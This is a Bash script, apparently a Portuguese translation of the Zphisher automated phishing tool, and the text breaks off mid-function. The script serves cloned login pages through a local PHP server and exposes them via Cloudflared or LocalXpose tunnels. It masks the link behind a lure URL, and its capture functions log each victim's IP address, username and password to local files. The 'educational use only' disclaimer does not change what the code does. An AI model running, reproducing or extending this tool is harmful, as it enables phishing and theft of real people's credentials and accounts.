#!/bin/bash

##   Zphisher        :       Ferramenta Automatizada de Phishing
##   Autor           :       Tranecck
##   Traduzido por   :       Trane
##   Versão          :       2.3.5
##   Github          :       https://github.com/htr-tech/zphisher
##
##   Copyright (C) 2025 Tranecck
##
##                   LICENÇA PÚBLICA GERAL GNU
##                    Versão 3, 29 de junho de 2007
##
##    Todos têm permissão para copiar e distribuir cópias literais
##    deste documento de licença, mas não é permitido alterá-lo.
##
##                         Preambulo
##
##    A Licença Pública Geral GNU é uma licença gratuita e copyleft para
##    software e outros tipos de obras.
##
##    As licenças da maioria dos softwares e outras obras práticas são projetadas
##    para tirar sua liberdade de compartilhar e alterar as obras. Em contraste,
##    a Licença Pública Geral GNU destina-se a garantir sua liberdade para
##    compartilhar e alterar todas as versões de um programa—para garantir que ele permaneça software livre para todos os seus usuários.
##    Você pode aplicá-la aos seus programas também.
##
##    Quando falamos de software livre, estamos nos referindo à liberdade, não
##    ao preço. Nossas Licenças Públicas Gerais são projetadas para garantir que você
##    tenha a liberdade de distribuir cópias de software livre (e cobrar por elas se desejar),
##    que você receba o código-fonte ou possa obtê-lo se quiser, que você possa alterar
##    o software ou usar partes dele em novos programas livres, e que você saiba que
##    pode fazer essas coisas.
##
##    Para proteger seus direitos, precisamos impedir que outros os neguem ou peçam que você
##    renuncie a esses direitos. Portanto, você tem certas responsabilidades se
##    distribuir cópias do software, ou se modificá-lo: responsabilidades de
##    respeitar a liberdade dos outros.
##
##    Por exemplo, se você distribuir cópias de tal programa, seja
##    gratuitamente ou por uma taxa, você deve transmitir aos destinatários as mesmas
##    liberdades que recebeu. Você deve garantir que eles também recebam ou possam
##    obter o código-fonte. E você deve mostrar a eles estes termos para que eles
##    conheçam seus direitos.
##
##    Os desenvolvedores que usam a GPL protegem seus direitos com duas etapas:
##    (1) afirmar direitos autorais sobre o software e (2) oferecer a você esta Licença
##    dando-lhe permissão legal para copiar, distribuir e/ou modificá-lo.
##
##    Para a proteção dos desenvolvedores e autores, a GPL explica claramente
##    que não há garantia para este software livre. Para o bem dos usuários e
##    autores, a GPL exige que versões modificadas sejam marcadas como
##    alteradas, para que seus problemas não sejam atribuídos erroneamente aos
##    autores das versões anteriores.
##
##    Alguns dispositivos são projetados para negar aos usuários acesso para instalar ou executar
##    versões modificadas do software dentro deles, embora o fabricante
##    possa fazê-lo. Isso é fundamentalmente incompatível com o objetivo de
##    proteger a liberdade dos usuários de alterar o software. O padrão sistemático
##    de tal abuso ocorre na área de produtos para indivíduos usarem, que é
##    precisamente onde é mais inaceitável. Portanto, projetamos esta versão
##    da GPL para proibir a prática para esses produtos. Se tais problemas surgirem
##    substancialmente em outros domínios, estamos preparados para estender esta
##    disposição a esses domínios em versões futuras, conforme necessário para proteger
##    a liberdade dos usuários.
##
##    Finalmente, todo programa é constantemente ameaçado por patentes de software.
##    Estados não devem permitir que patentes restrinjam o desenvolvimento e uso de
##    software em computadores de uso geral, mas naqueles que o fazem, queremos
##    evitar o perigo especial de que patentes aplicadas a um programa livre possam
##    torná-lo efetivamente proprietário. Para prevenir isso, a GPL assegura que
##    patentes não possam ser usadas para tornar o programa não-livre.
##
##    Os termos e condições precisos para copiar, distribuir e
##    modificar seguem.
##

__version__="2.3.5"

## HOST & PORTA PADRÃO
HOST='127.0.0.1'
PORT='8080'

## Cores ANSI (FG & BG)
RED="$(printf '\033[31m')"      GREEN="$(printf '\033[32m')"    ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"     WHITE="$(printf '\033[37m')"   BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"    GREENBG="$(printf '\033[42m')" ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Diretórios
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
    mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
    mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
    rm -rf ".server/www"
    mkdir -p ".server/www"
else
    mkdir -p ".server/www"
fi

## Remover arquivos de log antigos
[[ -e ".server/.loclx" ]] && rm -rf ".server/.loclx"
[[ -e ".server/.cld.log" ]] && rm -rf ".server/.cld.log"

## Tratamento de sinais para encerrar corretamente
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa Interrompido." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa Encerrado." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Resetar cores do terminal
reset_color() {
    tput sgr0   # resetar atributos
    tput op     # resetar cor
    return
}

## Finalizar processos em execução que possam conflitar
kill_pid() {
    check_PID="php cloudflared loclx"
    for process in ${check_PID}; do
        if [[ $(pidof ${process}) ]]; then
            killall ${process} > /dev/null 2>&1
        fi
    done
}

## Verificar se há uma versão mais recente
check_update() {
    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Verificando atualização: "
    release_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
    new_version=$(curl -s "${release_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
    tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"

    if [[ $new_version != $__version__ ]]; then
        echo -ne "${ORANGE}atualização encontrada\n"${WHITE}
        sleep 2
        echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Baixando Atualização..."
        pushd "$HOME" > /dev/null 2>&1
        curl --silent --insecure --fail --retry-connrefused \
             --retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"

        if [[ -e ".zphisher.tar.gz" ]]; then
            tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
            [ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Erro ao extrair."; reset_color; exit 1; }
            rm -f .zphisher.tar.gz
            popd > /dev/null 2>&1
            { sleep 3; clear; banner_small; }
            echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Atualizado com sucesso! Execute zphisher novamente\n\n"${WHITE}
            { reset_color ; exit 1; }
        else
            echo -e "\n${RED}[${WHITE}!${RED}]${RED} Erro ao baixar."
            { reset_color; exit 1; }
        fi
    else
        echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
    fi
}

## Verificar status da Internet
check_status() {
    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Status da Internet: "
    timeout 3s curl -fIs "https://api.github.com" > /dev/null
    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}Online${WHITE}"
        check_update
    else
        echo -e "${RED}Offline${WHITE}"
    fi
}

## Exibição do banner principal
banner() {
    cat <<- EOF
        ${ORANGE}
        ${ORANGE} ______      _     _     _               
        ${ORANGE}|___  /     | |   (_)   | |              
        ${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
        ${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
        ${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
        ${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
        ${ORANGE}      | |                                
        ${ORANGE}      |_|                ${RED}Versão : ${__version__}

        ${GREEN}[${WHITE}-${GREEN}]${CYAN} Ferramenta criada por Tranecck${WHITE}
    EOF
}

## Exibição do banner reduzido
banner_small() {
    cat <<- EOF
        ${BLUE}
        ${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
        ${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
        ${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
    EOF
}

## Instalando dependências necessárias
dependencies() {
    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacotes necessários..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ ! $(command -v proot) ]]; then
            echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi

        if [[ ! $(command -v tput) ]]; then
            echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
            pkg install ncurses-utils -y
        fi
    fi

    if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Pacotes já instalados."
    else
        pkgs=(php curl unzip)
        for pkg in "${pkgs[@]}"; do
            type -p "$pkg" &>/dev/null || {
                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote : ${ORANGE}$pkg${CYAN}"${WHITE}
                if [[ $(command -v pkg) ]]; then
                    pkg install "$pkg" -y
                elif [[ $(command -v apt) ]]; then
                    sudo apt install "$pkg" -y
                elif [[ $(command -v apt-get) ]]; then
                    sudo apt-get install "$pkg" -y
                elif [[ $(command -v pacman) ]]; then
                    sudo pacman -S "$pkg" --noconfirm
                elif [[ $(command -v dnf) ]]; then
                    sudo dnf -y install "$pkg"
                elif [[ $(command -v yum) ]]; then
                    sudo yum -y install "$pkg"
                else
                    echo -e "\n${RED}[${WHITE}!${RED}]${RED} Gerenciador de pacotes não suportado, instale manualmente."
                    { reset_color; exit 1; }
                fi
            }
        done
    fi
}

## Função auxiliar para baixar binários
download() {
    url="$1"
    output="$2"
    file=$(basename "$url")
    if [[ -e "$file" || -e "$output" ]]; then
        rm -rf "$file" "$output"
    fi
    curl --silent --insecure --fail --retry-connrefused \
         --retry 3 --retry-delay 2 --location --output "${file}" "${url}"

    if [[ -e "$file" ]]; then
        if [[ ${file##*.} == "zip" ]]; then
            unzip -qq "$file" > /dev/null 2>&1
            mv -f "$output" .server/"$output" > /dev/null 2>&1
        elif [[ ${file##*.} == "tgz" ]]; then
            tar -zxf "$file" > /dev/null 2>&1
            mv -f "$output" .server/"$output" > /dev/null 2>&1
        else
            mv -f "$file" .server/"$output" > /dev/null 2>&1
        fi
        chmod +x .server/"$output" > /dev/null 2>&1
        rm -rf "$file"
    else
        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Ocorreu um erro ao baixar ${output}."
        { reset_color; exit 1; }
    fi
}

## Instalar Cloudflared
install_cloudflared() {
    if [[ -e ".server/cloudflared" ]]; then
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared já instalado."
    else
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando Cloudflared..."${WHITE}
        arch=$(uname -m)
        if [[ "$arch" == *'arm'* || "$arch" == *'Android'* ]]; then
            download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" "cloudflared"
        elif [[ "$arch" == *'aarch64'* ]]; then
            download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" "cloudflared"
        elif [[ "$arch" == *'x86_64'* ]]; then
            download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" "cloudflared"
        else
            download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" "cloudflared"
        fi
    fi
}

## Instalar LocalXpose
install_localxpose() {
    if [[ -e ".server/loclx" ]]; then
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose já instalado."
    else
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando LocalXpose..."${WHITE}
        arch=$(uname -m)
        if [[ "$arch" == *'arm'* || "$arch" == *'Android'* ]]; then
            download "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" "loclx"
        elif [[ "$arch" == *'aarch64'* ]]; then
            download "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" "loclx"
        elif [[ "$arch" == *'x86_64'* ]]; then
            download "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" "loclx"
        else
            download "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" "loclx"
        fi
    fi
}

## Mensagem de saída
msg_exit() {
    { clear; banner; echo; }
    echo -e "${GREENBG}${BLACK} Obrigado por usar esta ferramenta. Tenha um bom dia.${RESETBG}\n"
    { reset_color; exit 0; }
}

## Tela "Sobre"
about() {
    { clear; banner; echo; }
    cat <<- EOF
        ${GREEN} Autor    ${RED}:  ${ORANGE}Tranecck
        ${GREEN} Traduzido por ${RED}:  ${ORANGE}Trane
        ${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech/zphisher
        ${GREEN} Versão   ${RED}:  ${ORANGE}${__version__}

        ${WHITE} ${REDBG}Aviso:${RESETBG}
        ${CYAN}  Esta ferramenta é feita apenas para fins educacionais ${RED}!${WHITE}${CYAN} O autor não será responsável por 
          qualquer uso indevido desta ferramenta ${RED}!${WHITE}

        ${RED}[${WHITE}00${RED}]${ORANGE} Menu Principal     ${RED}[${WHITE}99${RED}]${ORANGE} Sair

    EOF

    read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"
    case $REPLY in
        99)
            msg_exit
            ;;
        0 | 00)
            echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Retornando ao menu principal..."
            { sleep 1; main_menu; }
            ;;
        *)
            echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
            { sleep 1; about; }
            ;;
    esac
}

## Escolher porta personalizada
cusport() {
    echo
    read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Deseja uma porta personalizada ${GREEN}[${CYAN}s${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
    if [[ ${P_ANS} =~ ^([sSyY])$ ]]; then
        echo -e "\n"
        read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Insira sua porta personalizada de 4 dígitos [1024-9999] : ${WHITE}" CU_P
        if [[ -n ${CU_P} && "${CU_P}" =~ ^[1-9][0-9]{3}$ && ${CU_P} -ge 1024 ]]; then
            PORT=${CU_P}
            echo
        else
            echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Porta de 4 dígitos inválida : $CU_P, tente novamente...${WHITE}"
            { sleep 2; clear; banner_small; cusport; }
        fi
    else
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Usando porta padrão $PORT...${WHITE}\n"
    fi
}

## Configurar site e iniciar servidor PHP
setup_site() {
    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Configurando servidor..."${WHITE}
    cp -rf .sites/"$website"/* .server/www
    cp -f .sites/ip.php .server/www/
    echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Iniciando servidor PHP..."${WHITE}
    cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Capturar endereço IP
capture_ip() {
    IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
    IFS=$'\n'
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} IP da vítima : ${BLUE}$IP"
    echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Salvo em : ${ORANGE}auth/ip.txt"
    cat .server/www/ip.txt >> auth/ip.txt
}

## Capturar credenciais
capture_creds() {
    ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
    PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
    IFS=$'\n'
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Conta : ${BLUE}$ACCOUNT"
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Senha : ${BLUE}$PASSWORD"
    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Salvo em : ${ORANGE}auth/usernames.dat"
    cat .server/www/usernames.txt >> auth/usernames.dat
    echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Aguardando próxima informação de login, ${BLUE}Ctrl + C ${ORANGE}para sair. "
}

## Exibir dados coletados
capture_data() {
    echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Aguardando informações de login, ${BLUE}Ctrl + C ${ORANGE}para sair..."
    while true; do
        if [[ -e ".server/www/ip.txt" ]]; then
            echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} IP da vítima encontrado!"
            capture_ip
            rm -rf .server/www/ip.txt
        fi
        sleep 0.75
        if [[ -e ".server/www/usernames.txt" ]]; then
            echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Informações de login encontradas!!"
            capture_creds
            rm -rf .server/www/usernames.txt
        fi
        sleep 0.75
    done
}

## Iniciar Cloudflared
start_cloudflared() {
    rm .cld.log > /dev/null 2>&1 &
    cusport
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicializando... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
    { sleep 1; setup_site; }
    echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Lançando Cloudflared..."

    if command -v termux-chroot > /dev/null 2>&1; then
        sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
    fi

    sleep 8
    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
    custom_url "$cldflr_url"
    capture_data
}

## Autenticar LocalXpose
localxpose_auth() {
    ./.server/loclx -help > /dev/null 2>&1 &
    sleep 1
    [ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"

    if [[ "$(./.server/loclx account status | grep Error)" ]]; then
        echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Crie uma conta em ${ORANGE}localxpose.io${GREEN} & copie o token\n"
        sleep 3
        read -p "${RED}[${WHITE}-${RED}]${ORANGE} Insira o token do Loclx :${ORANGE} " loclx_token
        if [[ -z $loclx_token ]]; then
            echo -e "\n${RED}[${WHITE}!${RED}]${RED} Você deve inserir o Token do Localxpose."
            sleep 2
            tunnel_menu
        else
            echo -n "$loclx_token" > "$auth_f" 2> /dev/null
        fi
    fi
}

## Iniciar LocalXpose
start_loclx() {
    cusport
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicializando... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
    { sleep 1; setup_site; localxpose_auth; }
    echo -e "\n"
    read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Mudar região do servidor Loclx? ${GREEN}[${CYAN}s${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
    [[ "${opinion,,}" == "s" ]] && loclx_region="eu" || loclx_region="us"
    echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Lançando LocalXpose..."

    if command -v termux-chroot > /dev/null 2>&1; then
        sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region "${loclx_region}" --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
    else
        sleep 1 && ./.server/loclx tunnel --raw-mode http --region "${loclx_region}" --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
    fi

    sleep 12
    loclx_url=$(grep -o '[0-9a-zA-Z.]*\.loclx\.io' .server/.loclx)
    custom_url "$loclx_url"
    capture_data
}

## Iniciar servidor local
start_localhost() {
    cusport
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicializando... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
    setup_site
    { sleep 1; clear; banner_small; }
    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Hospedado com sucesso em : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
    capture_data
}

## Menu de seleção de túnel
tunnel_menu() {
    { clear; banner_small; }
    cat <<- EOF

        ${RED}[${WHITE}01${RED}]${ORANGE} Localhost
        ${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detecta${RED}]
        ${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NOVO! Máx 15Min${RED}]

    EOF

    read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione um serviço de encaminhamento de porta : ${BLUE}"
    case $REPLY in
        1 | 01)
            start_localhost
            ;;
        2 | 02)
            start_cloudflared
            ;;
        3 | 03)
            start_loclx
            ;;
        *)
            echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
            { sleep 1; tunnel_menu; }
            ;;
    esac
}

## Máscara de URL personalizada
custom_mask() {
    { sleep .5; clear; banner_small; echo; }
    read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Deseja alterar a URL mascarada? ${GREEN}[${CYAN}s${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" mask_op
    echo
    if [[ "${mask_op,,}" == "s" ]]; then
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Insira sua URL personalizada abaixo ${CYAN}(${ORANGE}Exemplo: https://get-free-followers.com${CYAN})\n"
        read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url
        if [[ "${mask_url//:*}" =~ ^https?$ || "${mask_url:0:3}" == "www" ]] && [[ "${mask_url#http*://}" =~ ^[^,~!@%\:=#;\^*\"\'\|\?+\<\>\(\)\}\{\\/]+$ ]]; then
            mask=$mask_url
            echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Usando URL Mascarada personalizada : ${GREEN}$mask"
        else
            echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Tipo de URL inválido... Usando a padrão..."
        fi
    fi
}

## Função para verificar status de um site (usada no encurtador)
site_stat() {
    [[ -n "$1" ]] && curl -s -o "/dev/null"
